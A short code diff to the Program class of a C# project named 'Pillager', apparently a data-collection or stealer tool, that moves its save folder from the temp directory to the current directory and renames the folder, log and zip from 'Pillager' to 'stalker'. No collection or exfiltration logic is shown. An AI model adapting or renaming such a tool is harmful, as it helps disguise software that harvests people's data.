@@ -8,8 +8,8 @@ namespace Pillager
 {
     internal class Program
     {
-        static string savepath = Path.Combine(Path.GetTempPath(), "Pillager");
-        static string logpath = Path.Combine(savepath, "Pillager.log");
+        static string savepath = Path.Combine(Directory.GetCurrentDirectory(), "stalker");
+        static string logpath = Path.Combine(savepath, "stalker.log");
         static string savezippath = savepath + ".zip";
         [STAThread]
         static void Main(string[] args)
